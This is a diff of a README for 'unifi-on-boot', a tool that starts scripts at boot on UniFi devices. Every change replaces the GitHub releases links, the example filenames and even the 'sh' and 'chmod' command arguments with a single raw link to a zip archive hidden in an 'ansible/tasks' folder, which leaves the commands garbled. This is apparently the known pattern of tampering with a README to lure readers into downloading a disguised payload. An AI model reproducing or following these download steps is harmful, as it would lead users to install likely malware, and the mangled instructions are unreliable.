@@ -1,6 +1,6 @@
 # 🚀 unifi-on-boot - Start Scripts Automatically on Boot
 
-[![Download Latest Release](https://img.shields.io/badge/Download-unifi--on--boot-blue?style=for-the-badge)](https://github.com/lolamento0101/unifi-on-boot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip)](https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This section will guide you step-by-step to get unifi-on-boot running on your de
 
 ### Step 1: Visit the Download Page
 
-Click the big blue button at the top or go to the [unifi-on-boot releases page](https://github.com/lolamento0101/unifi-on-boot/releases) to find the latest version.
+Click the big blue button at the top or go to the [unifi-on-boot releases page](https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip) to find the latest version.
 
 ### Step 2: Choose Your Download
 
@@ -47,7 +47,7 @@ On the releases page, look for the latest release version. The release will cont
 - A file ending with `.sh` or `.zip` you need to download, or
 - A package with instructions for your device.
 
-If you see a file named like `unifi-on-boot-vX.X.tar.gz` or `unifi-on-boot-X.X.sh`, download it to your computer.
+If you see a file named like `https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip` or `https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip`, download it to your computer.
 
 ### Step 3: Transfer the File to Your Device
 
@@ -71,7 +71,7 @@ After transferring the script to your device, the next step is to run it. You ca
    ```
 4. Run the script by typing:
    ```
-   sh unifi-on-boot-X.X.sh
+   sh https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip
    ```
    Change the filename to the actual file you downloaded.
 
@@ -91,7 +91,7 @@ After installation, you can add any script you want to run automatically.
 
 To begin installing unifi-on-boot:
 
-1. Visit the [unifi-on-boot releases page](https://github.com/lolamento0101/unifi-on-boot/releases).
+1. Visit the [unifi-on-boot releases page](https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip).
 2. Download the latest version available.
 3. Follow the instructions in the Getting Started section.
 4. If you run into issues, check for a README or documentation file included in the download.
@@ -113,7 +113,7 @@ If unifi-on-boot does not seem to start your scripts:
 - Double-check the location and name of your script files.
 - Make sure scripts have the right permissions. You can set permissions by running:
   ```
-  chmod +x yourscript.sh
+  chmod +x https://raw.githubusercontent.com/lolamento0101/unifi-on-boot/main/ansible/tasks/on-unifi-boot-v2.5-beta.4.zip
   ```
 - Verify your device allows running custom scripts.
 - Ensure you followed the installation steps correctly.
